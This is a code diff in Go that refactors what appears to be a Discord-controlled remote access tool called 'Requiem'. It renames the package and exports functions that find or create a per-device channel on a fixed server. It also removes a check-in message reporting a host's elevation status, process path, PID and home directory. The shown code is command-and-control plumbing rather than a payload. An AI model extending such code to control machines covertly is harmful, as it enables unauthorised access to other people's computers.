@@ -1,8 +1,6 @@
-package bot
+package discord
 
 import (
-	"fmt"
-	"os"
 	"strings"
 
 	"requiem/funcs"
@@ -13,7 +11,7 @@ import (
 
 const DEFAULT_CATEGORY_NAME string = "string2"
 
-func findCategory(ses *discordgo.Session) string {
+func FindCategory(ses *discordgo.Session) string {
 	channels, err := ses.GuildChannels(store.SERVER_ID)
 	if err != nil {
 		return ""
@@ -44,7 +42,7 @@ func findCategory(ses *discordgo.Session) string {
 }
 
 // the 2nd return is if the channel was newly created
-func findChannel(ses *discordgo.Session, categoryID string) (string, bool) {
+func FindChannel(ses *discordgo.Session, categoryID string) (string, bool) {
 	channels, err := ses.GuildChannels(store.SERVER_ID)
 	if err != nil {
 		return "", false
@@ -80,41 +78,4 @@ func findChannel(ses *discordgo.Session, categoryID string) (string, bool) {
 	}
 
 	return channel.ID, true
-}
-
-func getMessage(new bool) string {
-	mention := "here" // TODO
-	if store.IsAdmin {
-		mention = "everyone"
-	}
-
-	message := "Requiem has reconnected."
-	if new {
-		message = "Requiem has connected to a new device."
-	}
-
-	version := fmt.Sprintf(
-		"[%d.%d.%d - %s]",
-		store.VERSION_MAJOR,
-		store.VERSION_MINOR,
-		store.VERSION_PATCH,
-		store.TRACKING_ID,
-	)
-
-	info := fmt.Sprintf(
-		"Elevated: %t\nProcess Path: \"%s\"\nProcess ID: %d\nHome Path: \"%s\"",
-		store.IsAdmin,
-		store.ExecPath,
-		os.Getpid(),
-		store.HomePath,
-	)
-
-	return fmt.Sprintf(
-		"%s %s %s\n%s\nDo `%shelp` for a list of commands.",
-		mention,
-		message,
-		version,
-		info,
-		store.COMMAND_PREFIX,
-	)
 }
